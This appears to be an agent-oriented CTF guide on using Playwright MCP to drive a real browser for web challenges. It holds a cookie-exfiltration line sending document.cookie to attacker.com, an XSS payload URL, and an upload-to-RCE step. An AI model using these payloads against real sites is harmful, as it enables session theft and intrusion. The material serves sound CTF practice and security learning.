# CTF Web - Browser Automation via Playwright MCP

Many web challenges require a *real browser*: DOM XSS that only fires after JS
runs, admin-bot simulation, client-side crypto, SPA state, or multi-step flows
behind a login. **Playwright MCP** drives a real Chromium/Firefox/WebKit browser
from the agent using structured accessibility snapshots (no screenshots/vision
needed), so the agent can navigate, click, type, inspect the DOM, read the
console, and watch network traffic.

## Table of Contents
- [Setup](#setup)
- [Core Tools](#core-tools)
- [Reproducing the Admin Bot (DOM XSS)](#reproducing-the-admin-bot-dom-xss)
- [DOM, Console & Network Inspection](#dom-console--network-inspection)
- [Authenticated Flows & File Upload](#authenticated-flows--file-upload)
- [When to Use Playwright MCP vs curl](#when-to-use-playwright-mcp-vs-curl)

For interacting with the CTF *platform* itself (reading challenges, downloading
attachments, submitting flags) see
[../solve-challenge/SKILL.md](../solve-challenge/SKILL.md#ctf-platform-interaction-via-playwright-mcp).

---

## Setup

Repository: `https://github.com/microsoft/playwright-mcp` (Apache-2.0, official
Microsoft, tested v0.0.78+).

```bash
# Launch the MCP server (Node.js required); most clients auto-manage this:
npx @playwright/mcp@latest
# Headed browser for admin-bot-style challenges that need a visible page:
npx @playwright/mcp@latest --headless=false
```

---

## Core Tools

- Navigation: `browser_navigate`, `browser_navigate_back`, `browser_tabs`
- Read state: `browser_snapshot` (accessibility tree — the primary "see the page"
  tool), `browser_take_screenshot`, `browser_console_messages`, `browser_network_requests`
- Interact: `browser_click`, `browser_type`, `browser_fill_form`, `browser_press_key`,
  `browser_select_option`, `browser_hover`, `browser_file_upload`, `browser_handle_dialog`
- Script: `browser_evaluate` (run JS in page context), `browser_wait_for`

**Key insight:** `browser_snapshot` returns a structured accessibility tree with
stable element refs — prefer it over screenshots for deciding what to click/type.
It is cheaper and more reliable than vision-based approaches.

---

## Reproducing the Admin Bot (DOM XSS)

Many XSS challenges have an "admin bot" that visits your URL with the flag in its
cookie. When no bot is provided (or to test locally), Playwright MCP *is* your
bot: navigate to the payload URL as a scripted victim and observe the result.

```text
browser_navigate "https://chall.example.com/?q=<img src=x onerror=...>"
browser_console_messages        # did the payload execute? read console output
browser_network_requests        # did it exfil to your listener?
```

To validate a cookie-stealing payload end to end, set a test flag cookie and
confirm exfiltration to a placeholder collector you control:

```javascript
// browser_evaluate — simulate the victim holding the flag, then verify exfil
// Real challenge cookie is HttpOnly; this only models the non-HttpOnly case.
document.cookie = "flag=flag{test}; path=/";
new Image().src = "https://attacker.com/c?" + document.cookie;
```

**Key insight:** Playwright MCP lets the agent *be* the admin bot — it runs the
page's JavaScript exactly like a victim browser, so DOM-only XSS, framework
gadgets (Angular/Vue sandbox escapes), and mutation-XSS that never appear in raw
HTML become observable. Pair with the payloads in
[client-side.md](client-side.md) and [client-side-advanced.md](client-side-advanced.md).

---

## DOM, Console & Network Inspection

```text
browser_navigate "https://chall.example.com/app"
browser_snapshot                # full accessibility tree: hidden inputs, roles, refs
browser_evaluate "() => window.__APP_STATE__"   # dump SPA state / client secrets
browser_evaluate "() => [...document.scripts].map(s => s.src)"  # enumerate JS bundles
browser_network_requests        # hidden API endpoints, tokens, XHR/fetch targets
browser_console_messages        # source maps, debug leaks, error stack traces
```

Client-side challenges frequently hide the answer in JS: a client-side HMAC
secret, a disabled button, a flag assembled in memory. `browser_evaluate` reads
live JS values that never appear in the served HTML.

**Key insight:** `browser_network_requests` surfaces the real API surface (XHR/
fetch endpoints, bearer tokens, WebSocket URLs) that a static `curl` of the HTML
misses because they are issued by JavaScript after load.

---

## Authenticated Flows & File Upload

```text
browser_navigate "https://chall.example.com/login"
browser_fill_form               # username/password fields (refs from snapshot)
browser_click <login button ref>
browser_wait_for "Dashboard"    # wait for post-login state
# session cookies now persist in the browser context for subsequent requests
browser_file_upload "/tmp/shell.png"   # drive an upload-to-RCE flow in-browser
```

**Key insight:** Playwright keeps the browser context (cookies, localStorage)
across tool calls, so multi-step authenticated challenges — log in, navigate to a
protected feature, trigger the bug — work without manually re-sending session
headers. This is the browser-side complement to the header/cookie forging in
[auth-and-access.md](auth-and-access.md).

---

## When to Use Playwright MCP vs curl

| Situation | Use |
|-----------|-----|
| Bug needs JavaScript to execute (DOM XSS, SPA, client crypto) | Playwright MCP |
| Simulating the admin bot / a victim browser | Playwright MCP |
| Reading JS-issued API calls, live DOM, or client secrets | Playwright MCP |
| Multi-step authenticated UI flow | Playwright MCP |
| Raw request smuggling, header injection, byte-exact payloads | `curl` (see [SKILL.md](SKILL.md#quick-start-commands)) |
| Fast fuzzing / brute force | `ffuf` / `requests` — faster, no browser overhead |

**Key insight:** Reach for Playwright MCP when the *browser* is part of the
vulnerability (client-side execution, victim simulation). For server-side bugs
where you need control over exact bytes on the wire, `curl`/`requests` remain the
right tool — the browser normalizes and re-encodes requests in ways that defeat
smuggling and injection payloads.
